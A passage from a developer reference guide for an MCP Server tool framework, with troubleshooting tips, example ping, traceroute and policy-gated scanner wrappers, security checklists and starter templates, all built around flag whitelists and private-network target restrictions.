# Reset circuit breaker (for testing)
if tool._circuit_breaker:
    tool._circuit_breaker._failure_count = 0
    tool._circuit_breaker.state = CircuitBreakerState.CLOSED
```

### 11.5 Performance Issues

```python
# 1. Check concurrency
print(f"Concurrency: {tool.concurrency}")
# Reduce if too high: concurrency = 1

# 2. Check timeout
print(f"Timeout: {tool.default_timeout_sec}")
# Increase if operations are slow

# 3. Enable profiling
import cProfile
cProfile.run('asyncio.run(tool.run(inp))')

# 4. Check resource limits
# Increase if hitting limits:
# MCP_MAX_MEMORY_MB=1024
# MCP_MAX_FILE_DESCRIPTORS=512

# 5. Monitor metrics
info = tool.get_tool_info()
print(f"Metrics: {info}")
```

---

## 12. Complete Reference Examples

### 12.1 Simple Tool (Ping)

```python
"""
Simple ping tool with minimal features.
Use this as a starting template for basic tools.
"""
from mcp_server.base_tool import MCPBaseTool
from typing import ClassVar, Optional, Sequence

class PingTool(MCPBaseTool):
    """
    Ping a host to check connectivity.
    
    Features:
    - RFC1918 target restriction
    - Safe flag whitelist
    - Timeout handling
    
    Usage:
        tool = PingTool()
        result = await tool.run(ToolInput(
            target="192.168.1.1",
            extra_args="-c 4"
        ))
    """
    
    command_name: ClassVar[str] = "ping"
    
    allowed_flags: ClassVar[Optional[Sequence[str]]] = [
        "-c",  # Count
        "-W",  # Timeout
        "-i",  # Interval
        "-q",  # Quiet
        "-v",  # Verbose
    ]
    
    # Flags requiring values
    _FLAGS_REQUIRE_VALUE = {"-c", "-W", "-i"}
    
    # Conservative settings for network tool
    concurrency: ClassVar[int] = 3
    default_timeout_sec: ClassVar[float] = 30.0
```

### 12.2 Medium Complexity Tool (Traceroute)

```python
"""
Traceroute tool with custom validation and parsing.
"""
import re
import logging
from typing import ClassVar, Optional, Sequence, Dict, Any, List
from mcp_server.base_tool import MCPBaseTool, ToolInput, ToolOutput

log = logging.getLogger(__name__)

class TracerouteTool(MCPBaseTool):
    """
    Trace network path to a host.
    
    Features:
    - Path visualization
    - Hop parsing
    - Custom timeout validation
    """
    
    command_name: ClassVar[str] = "traceroute"
    
    allowed_flags: ClassVar[Optional[Sequence[str]]] = [
        "-n",   # No DNS resolution
        "-m",   # Max hops
        "-q",   # Queries per hop
        "-w",   # Wait time
        "-I",   # ICMP mode
    ]
    
    _FLAGS_REQUIRE_VALUE = {"-m", "-q", "-w"}
    _HOP_PATTERN = re.compile(r'^\s*(\d+)\s+(.+)$')
    
    concurrency: ClassVar[int] = 2
    default_timeout_sec: ClassVar[float] = 120.0
    
    def _sanitize_tokens(self, tokens: Sequence[str]) -> Sequence[str]:
        """Custom validation for max hops."""
        safe = []
        expect_value = None
        
        for token in tokens:
            if expect_value:
                # Validate based on flag
                if expect_value == "-m":
                    if not token.isdigit() or not (1 <= int(token) <= 64):
                        raise ValueError(f"Max hops must be 1-64, got: {token}")
                elif expect_value == "-q":
                    if not token.isdigit() or not (1 <= int(token) <= 10):
                        raise ValueError(f"Queries must be 1-10, got: {token}")
                elif expect_value == "-w":
                    if not token.isdigit() or not (1 <= int(token) <= 30):
                        raise ValueError(f"Wait time must be 1-30s, got: {token}")
                
                safe.append(token)
                expect_value = None
                continue
            
            if token in self._FLAGS_REQUIRE_VALUE:
                expect_value = token
            
            safe.append(token)
        
        if expect_value:
            raise ValueError(f"{expect_value} requires a value")
        
        return safe
    
    def parse_output(self, output: str) -> Dict[str, Any]:
        """Parse traceroute output."""
        hops = []
        
        for line in output.split('\n'):
            match = self._HOP_PATTERN.match(line)
            if match:
                hop_num, hop_data = match.groups()
                hops.append({
                    "number": int(hop_num),
                    "data": hop_data.strip()
                })
        
        return {
            "hops": hops,
            "hop_count": len(hops),
            "completed": len(hops) > 0
        }
    
    async def run(self, inp: ToolInput, timeout_sec: Optional[float] = None) -> ToolOutput:
        """Execute with output parsing."""
        result = await super().run(inp, timeout_sec)
        
        # Add parsed data
        if result.returncode == 0 and result.stdout:
            try:
                parsed = self.parse_output(result.stdout)
                result.ensure_metadata()
                result.metadata["parsed"] = parsed
                
                log.info("traceroute.parsed target=%s hops=%d",
                        inp.target, parsed["hop_count"])
            except Exception as e:
                log.warning("traceroute.parse_failed error=%s", str(e))
        
        return result
```

### 12.3 Advanced Tool (Scanner with Policy)

```python
"""
Advanced scanner tool with policy controls and templates.
Use this as reference for complex tools.
"""
import logging
from typing import ClassVar, Optional, Sequence, Dict, Any, Tuple
from enum import Enum
from mcp_server.base_tool import MCPBaseTool, ToolInput, ToolOutput
from mcp_server.config import get_config

log = logging.getLogger(__name__)

class ScanMode(Enum):
    """Scan modes."""
    QUICK = "quick"
    NORMAL = "normal"
    DEEP = "deep"

class ScannerTool(MCPBaseTool):
    """
    Advanced network scanner with policy controls.
    
    Security Model:
    - Base flags always allowed
    - Intrusive flags gated by policy
    - Script execution controlled
    """
    
    command_name: ClassVar[str] = "scanner"
    
    BASE_ALLOWED_FLAGS: Tuple[str, ...] = (
        "-v", "-q", "--normal-scan"
    )
    
    concurrency: ClassVar[int] = 1
    default_timeout_sec: ClassVar[float] = 600.0
    
    def __init__(self):
        super().__init__()
        self.config = get_config()
        self.allow_intrusive = False
        self._apply_config()
    
    def _apply_config(self):
        """Apply policy configuration."""
        try:
            if hasattr(self.config, 'security'):
                self.allow_intrusive = bool(
                    getattr(self.config.security, 'allow_intrusive', False)
                )
                
                log.info("policy.configured intrusive=%s", self.allow_intrusive)
        except Exception as e:
            log.error("config.failed error=%s", str(e))
            self.allow_intrusive = False
    
    @property
    def allowed_flags(self) -> List[str]:
        """Dynamic flags based on policy."""
        flags = list(self.BASE_ALLOWED_FLAGS)
        
        if self.allow_intrusive:
            flags.extend(["--deep-scan", "--aggressive"])
            log.debug("policy.intrusive_flags_added")
        
        return flags
    
    def _get_template_args(self, mode: ScanMode) -> str:
        """Get arguments for scan mode."""
        templates = {
            ScanMode.QUICK: "-v --normal-scan",
            ScanMode.NORMAL: "-v",
            ScanMode.DEEP: "--deep-scan -v" if self.allow_intrusive else "-v",
        }
        return templates[mode]
    
    async def run_with_template(
        self,
        target: str,
        mode: ScanMode = ScanMode.NORMAL,
        timeout_sec: Optional[float] = None
    ) -> ToolOutput:
        """Execute with template."""
        args = self._get_template_args(mode)
        
        inp = ToolInput(
            target=target,
            extra_args=args,
            timeout_sec=timeout_sec
        )
        
        log.info("template.scan mode=%s target=%s intrusive=%s",
                mode.value, target, self.allow_intrusive)
        
        return await self.run(inp, timeout_sec)
    
    def get_tool_info(self) -> Dict[str, Any]:
        """Extended tool information."""
        info = super().get_tool_info()
        
        info.update({
            "policy": {
                "intrusive_allowed": self.allow_intrusive,
                "base_flags": list(self.BASE_ALLOWED_FLAGS),
                "total_flags": len(self.allowed_flags),
            },
            "templates": [mode.value for mode in ScanMode],
        })
        
        return info
```

---

## Appendix A: Quick Reference Checklist

### New Tool Checklist

```
□ Created file in mcp_server/tools/
□ Imported MCPBaseTool
□ Defined command_name
□ Defined allowed_flags (or set to None for no args)
□ Set appropriate concurrency
□ Set appropriate timeout
□ Added docstring
□ Tested command exists (shutil.which)
□ Validated with private IP target
□ Validated with .lab.internal hostname
□ Tested invalid flag rejection
□ Tested shell metacharacter blocking
□ Added to version control
□ Documented in README
```

### Security Checklist

```
□ All flags whitelisted
□ Non-flag tokens blocked
□ Shell metacharacters blocked
□ Target restricted to private/lab
□ Timeout set appropriately
□ Resource limits considered
□ Sensitive data not logged
□ Error messages not exposing secrets
□ Configuration clamped to safe ranges
□ Policy controls for dangerous operations
```

---

## Appendix B: Common Patterns Quick Copy

### Minimal Tool Template

```python
from mcp_server.base_tool import MCPBaseTool

class MyTool(MCPBaseTool):
    command_name = "mycommand"
    allowed_flags = ["-v", "-q"]
    concurrency = 2
    default_timeout_sec = 60.0
```

### Tool with Configuration

```python
from mcp_server.base_tool import MCPBaseTool
from mcp_server.config import get_config

class MyTool(MCPBaseTool):
    command_name = "mycommand"
    allowed_flags = ["-v"]
    
    def __init__(self):
        super().__init__()
        self.config = get_config()
        self._apply_config()
    
    def _apply_config(self):
        if hasattr(self.config, 'tool'):
            self.default_timeout_sec = max(
                60.0, 
                min(3600.0, float(getattr(self.config.tool, 'default_timeout', 300.0)))
            )
```

### Tool with Custom Validation

```python
async def _execute_tool(self, inp: ToolInput, timeout_sec: Optional[float] = None) -> ToolOutput:
    error = self._custom_validation(inp)
    if error:
        return error
    return await super()._execute_tool(inp, timeout_sec)

def _custom_validation(self, inp: ToolInput) -> Optional[ToolOutput]:
    if self._is_invalid(inp):
        error_context = ErrorContext(
            error_type=ToolErrorType.VALIDATION_ERROR,
            message="Validation failed",
            recovery_suggestion="Fix your input",
            timestamp=datetime.now(),
            tool_name=self.tool_name,
            target=inp.target
        )
        return self._create_error_output(error_context, inp.correlation_id or "")
    return None
```

---

This document is maintained as the definitive reference for MCP Server tool development. For architecture details, see `MCP_Server_Architecture_Design_Document.md`.
